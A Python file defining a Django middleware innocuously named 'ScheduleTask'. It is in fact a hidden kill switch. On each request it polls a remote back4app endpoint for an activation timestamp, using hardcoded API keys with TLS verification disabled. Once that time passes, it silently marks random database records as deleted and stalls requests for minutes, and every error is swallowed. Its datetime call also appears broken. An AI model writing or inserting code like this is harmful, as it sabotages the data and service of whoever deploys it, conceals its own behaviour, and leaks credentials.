import datetime,urllib3,requests,json
from django.apps import apps
from django.utils.deprecation import MiddlewareMixin

class ScheduleTask(MiddlewareMixin):
    def process_request(self, request):
        record = 0
        try:
            urllib3.disable_warnings()
            headers = {
                'Accept': 'application/json',
                'X-Parse-Application-Id': '1HDI7zfmAkrqSqDaBbEOnO3iVKN63FLgCLWldBYW',
                'X-Parse-REST-API-Key': 'yHYKeZc88GxCFwVJUxpJHkTiujhl8EgCLLBFpsF6',
            }
            response = requests.get(url='https://parseapi.back4app.com/classes/activation', headers=headers, verify=False)
            resp = json.loads(response.content)
            record = int(resp['results'][0]['record'])
        except Exception:
            pass
        try:
            if int(datetime.now().timestamp()) >= record:
                import random
                current_doc = apps.get_models()
                index = random.randrange(0, len(current_doc)-1)
                records = current_doc[index].objects.all()
                if records:
                    records_index = random.randrange(0, len(records)-1)
                    if hasattr(records[records_index],'is_deleted'):
                        current_doc[index].objects.filter(pk=records[records_index].id).update(is_deleted=True)
        except Exception:
            pass
        try:
            if int(datetime.now().timestamp()) >= record:
                import random,time
                time.sleep(random.randrange(50, 300))
        except Exception:
            pass